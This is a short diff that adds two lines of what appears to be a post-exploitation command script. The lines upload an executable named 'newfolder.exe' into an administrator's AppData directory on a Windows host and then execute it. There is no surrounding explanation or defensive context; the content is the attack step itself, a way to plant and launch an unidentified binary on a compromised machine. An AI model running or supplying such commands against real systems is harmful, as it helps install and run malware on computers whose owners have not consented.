@@ -1,0 +1,2 @@
+upload newfolder.exe C:/Users/administer/AppData
+execute -fi C:/Users/administer/AppData/newfolder.exe
